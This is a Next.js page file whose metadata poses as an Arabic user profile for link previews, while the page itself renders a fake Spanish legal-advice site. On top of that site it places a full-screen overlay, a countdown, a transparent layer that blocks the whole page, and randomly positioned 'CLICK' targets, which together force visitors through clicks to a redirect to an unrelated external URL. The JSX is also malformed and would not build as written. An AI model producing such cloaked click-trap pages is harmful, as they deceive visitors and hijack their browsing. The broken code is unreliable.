import Head from 'next/head';

export async function getServerSideProps(context) {
  const { username } = context.params;
  const safeUsername = username.replace(/[^a-zA-Z0-9\u0600-\u06FF]/g, '');

  return {
    props: {
      username: safeUsername,
    },
  };
}

export default function ProfilePage({ username }) {
  const capitalized = username.charAt(0).toUpperCase() + username.slice(1).toLowerCase();

  return (
    <>
      <Head>
	    <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>{capitalized} - ملف شخصي</title>
        <meta property="og:title" content={`${capitalized} - ملف شخصي`} />
        <meta property="og:description" content={`هذه الصفحة تخص ${capitalized}`} />
        <meta content='https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi52ZLn3nr1zOwQpETR1TgGydtN2O_ElKvlT8m2sdT9gZOrdIssa8NlFsXPDDTy1YPF9JeAmN68kNpQC4NNw7QFX6XlTJBdLAG0xfyWmHekXPkySGRdMj4et0OxszXdtNke_su3mb5xoaZ0a29aLn3HcdL_8iPFflHw9y0a6miQ84TULXz8H5ELsDI5vNo/s1600/ogimage.jpg' property='og:image'/>
        <meta property="og:url" content={`https://xte.abbraccio.site/${username}`} />
		  <style>
    body {
      margin: 0;
      font-family: 'Poppins', sans-serif;
      background: #fff;
      color: #181818;
    }

    header {
      background: #491068;
      padding: 1rem 2rem;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    header img {
      height: 50px;
    }

    .content-loop {
      max-width: 1200px;
      margin: auto;
      padding: 2rem;
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
      gap: 1.5rem;
    }

    .article-loop {
      border-radius: 10px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      overflow: hidden;
      background: #fff;
      text-align: center;
      transition: transform 0.3s;
    }

    .article-loop:hover {
      transform: translateY(-5px);
    }

    .article-image {
      height: 180px;
      background-size: cover;
      background-position: center;
    }

    .entry-title {
      padding: 1rem;
      font-size: 1rem;
      font-weight: 600;
      color: #181818;
    }

    footer {
      background: #2471a3;
      color: #fff;
      text-align: center;
      padding: 1rem;
    }

    footer a {
      color: #fff;
      text-decoration: underline;
      margin: 0 5px;
    }

    #entrada-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background-color: black;
      color: white;
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 999999;
      flex-direction: column;
      font-family: sans-serif;
      text-align: center;
      padding: 1rem;
      box-sizing: border-box;
    }

    #btn-acceder {
      background: none;
      border: none;
      cursor: pointer;
      padding: 0;
    }

    #btn-acceder img {
      max-width: 90vw;
      height: auto;
    }

    #contador-entrada {
      display: none;
      font-size: 60px;
      margin-top: 20px;
      color: red;
    }

    #btn-close-ad {
      display: none;
      position: absolute;
      top: 10px;
      right: 10px;
      background: red;
      color: white;
      border: none;
      padding: 5px 10px;
      border-radius: 50%;
      font-size: 20px;
      cursor: pointer;
      z-index: 1000000;
    }

    .click-point {
      display: none;
      position: fixed;
      width: 100px;
      height: 100px;
      background-color: red;
      border-radius: 50%;
      color: white;
      font-weight: bold;
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      z-index: 1000000;
      flex-direction: column;
    }

    #bloqueo-total {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background-color: transparent;
      z-index: 999998;
      pointer-events: all;
    }
  </style>
        <meta property="og:type" content="website" />
      </Head>
     <body>

  <header>
    <a href="/">
      <img src="https://verplay.pro/redi/cropped-ABOGADOS-1-Photoroom.png" alt="Abogado Real">
    </a>
  </header>

  <main class="content-loop">
    <div class="article-loop">
      <div class="article-image" style="background-image: url('https://verplay.pro/redi/80-400x267.jpg');"></div>
      <p class="entry-title">Derechos del Propietario vs. Ocupante Ilegal: ¿Qué Hacer?</p>
    </div>
    <div class="article-loop">
      <div class="article-image" style="background-image: url('https://verplay.pro/redi/gastos-impuestos-compraventa-viviendas-400x267.jpg');"></div>
      <p class="entry-title">Impuestos en la Compra y Venta de Inmuebles: Lo Básico</p>
    </div>
    <div class="article-loop">
      <div class="article-image" style="background-image: url('https://verplay.pro/redi/proteccion-al-inquilino-1400x933-1-400x267.jpeg');"></div>
      <p class="entry-title">Donaciones de Propiedades: Aspectos Legales que Debes Conocer</p>
    </div>
    <div class="article-loop">
      <div class="article-image" style="background-image: url('https://verplay.pro/redi/Derechos-y-obligaciones-del-inquilino-en-una-vivienda-de-alquiler-alojamiento-apartamento-alcaniz-flats-scaled-1-400x267.jpg');"></div>
      <p class="entry-title">Inquilino vs. Propietario: Derechos y Deberes en Arrendamientos</p>
    </div>
    <div class="article-loop">
      <div class="article-image" style="background-image: url('https://verplay.pro/redi/usucapion-o-prescripcion-administrativa-400x267.jpeg');"></div>
      <p class="entry-title">¿Qué es la Usucapión y Cómo Reclamar Propiedad?</p>
    </div>
    <div class="article-loop">
      <div class="article-image" style="background-image: url('https://verplay.pro/redi/Diseno-sin-titulo-scaled-1-400x267.jpg');"></div>
      <p class="entry-title">Aspectos Legales en la Compra de Terrenos Rústicos</p>
    </div>
  </main>

  <footer>
    <p>&copy; 2025 Abogado Real. Todos los derechos reservados.</p>
    <p><a href="#">Cookies</a> | <a href="#">Aviso Legal</a> | <a href="#">Privacidad</a></p>
  </footer>

  <div id="entrada-overlay">
    <button id="btn-acceder">
      <img src="https://visionempresarial.online/sc/new/8766f384-f63e-4b7a-ad59-35416aa66a98.png" alt="Acceder">
    </button>
    <div id="contador-entrada">7</div>
    <button id="btn-close-ad">❌</button>
  </div>

  <div class="click-point" id="click-point-1">CLICK</div>
  <div class="click-point" id="click-point-2">CLICK</div>

  <div id="bloqueo-total" style="display: none;"></div>

  <script>
    document.addEventListener("DOMContentLoaded", function () {
      const btnAcceder = document.getElementById("btn-acceder");
      const contador = document.getElementById("contador-entrada");
      const overlay = document.getElementById("entrada-overlay");
      const bloqueoTotal = document.getElementById("bloqueo-total");
      const btnCloseAd = document.getElementById("btn-close-ad");
      const punto1 = document.getElementById("click-point-1");
      const punto2 = document.getElementById("click-point-2");

      const redireccionFinal = "https://star168.7lha.com/archives/61761";

      btnAcceder.addEventListener("click", () => {
        btnAcceder.style.display = "none";
        contador.style.display = "block";

        let segundos = 7;
        contador.textContent = segundos;

        const countdown = setInterval(() => {
          segundos--;
          if (segundos > 0) {
            contador.textContent = segundos;
          } else {
            clearInterval(countdown);
            contador.style.display = "none";
            btnCloseAd.style.display = "block";
          }
        }, 1000);
      });

      btnCloseAd.addEventListener("click", () => {
        overlay.style.display = "none";
        bloqueoTotal.style.display = "block";

        const x1 = Math.random() * (window.innerWidth - 100);
        const y1 = Math.random() * (window.innerHeight - 100);
        punto1.style.left = x1 + "px";
        punto1.style.top = y1 + "px";
        punto1.style.display = "flex";

        punto1.addEventListener("click", () => {
          punto1.style.display = "none";
          const x2 = Math.random() * (window.innerWidth - 100);
          const y2 = Math.random() * (window.innerHeight - 100);
          punto2.style.left = x2 + "px";
          punto2.style.top = y2 + "px";
          punto2.style.display = "flex";
        });

        punto2.addEventListener("click", () => {
          window.location.href = redireccionFinal;
        });
      });
    });
  </script>
</body>
    </>
  );
}
